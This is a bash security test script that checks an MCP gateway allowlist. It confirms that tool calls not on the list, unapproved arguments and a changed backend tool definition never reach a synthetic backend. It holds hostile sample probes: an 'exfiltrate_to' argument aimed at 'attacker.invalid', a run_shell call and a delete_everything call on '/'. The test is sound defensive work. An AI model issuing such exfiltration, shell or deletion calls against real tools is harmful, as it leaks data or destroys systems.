#!/usr/bin/env bash
# Security proof 3 of 3 (DoD 2.6): the MCP gateway blocks a tool call that is not on
# the allowlist, and a changed tool definition does not become usable.
#
#   ./03-mcp-blocked.sh --fixture      the sandbox rig (fixture/up.sh): the SHIPPED `web`
#                                      allowlist block on the pinned LiteLLM, in front of a
#                                      synthetic backend that records every call it receives
#
# THE ALLOWLIST IS config/litellm/config.yaml `mcp_servers:` (the one list Hermes, n8n
# and Open WebUI share).  It has two layers:  allowed_tools  (which tool NAMES)  and
# allowed_params  (which ARGUMENT KEYS per tool).
#
# The only honest way to tell "the gateway blocked it" from "the backend said no" is
# the backend's own request log.  A blocked call must leave the backend's tools/call
# count UNCHANGED: it never arrived.
#
# CHANGED TOOL DEFINITION (the agentgateway test).  The backend is flipped from v1 to a
# v2 that advertises a new argument, `exfiltrate_to`, that nobody approved.  A call that
# uses it must still be refused and must never reach the backend.  The script also says
# when the advertised definition has drifted from config/mcp/tools.lock.json.
#
# HOW FAR THIS GOES (measured in NOM-412, stated here so nobody over-reads the PASS):
# it checks argument NAMES, not types or required fields, and `tools/list` shows the
# backend's live schema.  What is blocked is every argument the owner did not allow.
#
# Exit 0 PASS, 1 FAIL, 2 NOT MEASURED.
set -uo pipefail
NAME=03-mcp-blocked
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
# shellcheck source=lib.sh
. "$HERE/lib.sh"
[ "${1:-}" = "--fixture" ] || { sed -n 2,26p "$0" | sed 's/^# \{0,1\}//'; exit 2; }
S="$HERE/fixture/.state"
[ -s "$S/mcp_key" ] || { echo "fixture is not up: run security-proof/fixture/up.sh" >&2; exit 2; }
URL="http://127.0.0.1:18400/mcp"; KEY="$S/mcp_key"; LOG="$S/mcp/requests.log"; VER="$S/mcp/version"
command -v python3 >/dev/null || { echo "needs python3" >&2; exit 2; }

probe() { python3 "$HERE/mcp_probe.py" "$URL" "$KEY" "$@" 2>&1; }
jget()  { python3 -c 'import json,sys; d=json.loads(sys.stdin.read()); v=d[sys.argv[1]]; print(v if not isinstance(v,(dict,list)) else json.dumps(v))' "$1"; }
calls() { local n; n=$(grep -c '"method": "tools/call"' "$LOG") || n=0; printf '%s' "$n"; }
ver()   { tr -d '[:space:]' < "$VER"; }
trap 'echo v1 > "$VER"' EXIT          # leave the backend as we found it

# $1 label  $2 tool  $3 json args   -> must be BLOCKED and the backend must not see it
must_block() {
  local before after r o d; before="$(calls)"; r="$(probe call "$2" "$3")"; after="$(calls)"
  o="$(jget outcome <<<"$r" 2>/dev/null)"; d="$(jget detail <<<"$r" 2>/dev/null)"
  if [ "$o" = blocked ] && [ "$after" = "$before" ]; then ok "$1 -> BLOCKED ($d); backend calls $before -> $after"
  else bad "$1 -> $o ($d); backend calls $before -> $after"; fi
}

title "Gateway under test" "$URL  (pinned LiteLLM; allowlist = the shipped config/litellm/config.yaml, web server)"
info "backend serves definition: $(ver)"

title "1. What the client may even see"
r="$(probe list)"; tools="$(jget tools <<<"$r")"
info "tools/list for the app's key: $tools"
if [ "$(jget outcome <<<"$r")" != ok ]; then skip "tools/list failed: $r"
else
  python3 - "$tools" <<'PY' && ok "only allowlisted tools are listed (web-web_search, web-fetch_page); delete_everything is not" || bad "tools/list shows a tool that is not allowlisted, or lacks an allowlisted one"
import json, sys
names = set(json.loads(sys.argv[1]))
sys.exit(0 if names == {"web-web_search", "web-fetch_page"} else 1)
PY
fi

title "2. Control: an allowed call must WORK" "so that 'blocked' below means something"
before="$(calls)"; r="$(probe call web-web_search '{"query":"hello","limit":3}')"; after="$(calls)"
if [ "$(jget outcome <<<"$r")" = ok ] && [ "$after" -gt "$before" ]; then ok "web-web_search {query, limit} -> executed by the backend (calls $before -> $after)"
else bad "control failed: $r (calls $before -> $after); the gateway or backend is not working, so no block below proves anything"; fi

title "3. A tool that is NOT on the allowlist"
must_block "web-delete_everything {path:/}          " web-delete_everything '{"path":"/"}'
must_block "delete_everything (bare name, no server)" delete_everything '{"path":"/"}'
must_block "unknown tool web-run_shell              " web-run_shell '{"cmd":"id"}'

title "4. An allowed tool with an argument nobody approved"
must_block "web-web_search + exfiltrate_to          " web-web_search '{"query":"x","exfiltrate_to":"http://attacker.invalid/"}'
must_block "web-fetch_page + extra key              " web-fetch_page '{"url":"https://example.com","headers":{"X":"y"}}'

title "5. The backend CHANGES its tool definition (v1 -> v2)" "v2 adds the argument exfiltrate_to to web_search, as a compromised or updated backend might"
echo v2 > "$VER"
r="$(probe call web-web_search '{"query":"ping"}')"        # a harmless call so the backend log records the version it served
last="$(tail -1 "$LOG")"
case "$last" in *'"version_served": "v2"'*) ok "the backend is now serving definition v2 (its own log says so)" ;; *) bad "the backend did not switch to v2: $last" ;; esac
r="$(probe list)"
python3 - "$(jget tools <<<"$r")" "$ROOT/config/mcp/tools.lock.json" <<'PY'
import json, sys
live = json.loads(sys.argv[1]); lock = json.load(open(sys.argv[2]))["tools"]
drift = []
for name, args in sorted(live.items()):
    if name not in lock: drift.append("%s is not in the lock" % name); continue
    extra = sorted(set(args) - set(lock[name]["arguments"]))
    if extra: drift.append("%s now advertises %s" % (name, ", ".join(extra)))
print("        DRIFT from config/mcp/tools.lock.json: " + ("; ".join(drift) if drift else "none"))
sys.exit(0 if drift else 1)
PY
[ $? -eq 0 ] && ok "the changed definition is DETECTED: the live schema differs from the committed lock" \
             || info "the gateway's tools/list did not show the change (it keeps the allowlist's view); the call checks below are what protect you"
must_block "v2: web-web_search + exfiltrate_to (v2 now ALLOWS it)" web-web_search '{"query":"x","exfiltrate_to":"http://attacker.invalid/"}'
must_block "v2: web-delete_everything                            " web-delete_everything '{"path":"/"}'
before="$(calls)"; r="$(probe call web-web_search '{"query":"still works","limit":1}')"; after="$(calls)"
[ "$(jget outcome <<<"$r")" = ok ] && [ "$after" -gt "$before" ] && ok "v2: the allowed call (query, limit) still works: the block is on the argument, not the whole tool" \
  || bad "v2: the allowed call stopped working: $r"
echo v1 > "$VER"

title "6. No key / a wrong key"
BADKEY="$(mktemp)"; trap 'rm -f "$BADKEY"; echo v1 > "$VER"' EXIT; printf 'sk-not-a-real-key' > "$BADKEY"
before="$(calls)"; r="$(python3 "$HERE/mcp_probe.py" "$URL" "$BADKEY" call web-web_search '{"query":"x"}')"; after="$(calls)"
[ "$(jget outcome <<<"$r")" = blocked ] && [ "$after" = "$before" ] && ok "a wrong key -> BLOCKED ($(jget detail <<<"$r")); backend calls $before -> $after" || bad "a wrong key was not blocked: $r"

verdict "a non-allowlisted tool call is blocked, and a changed tool definition does not become callable" "a non-allowlisted call or an unapproved argument got through, or the control failed"
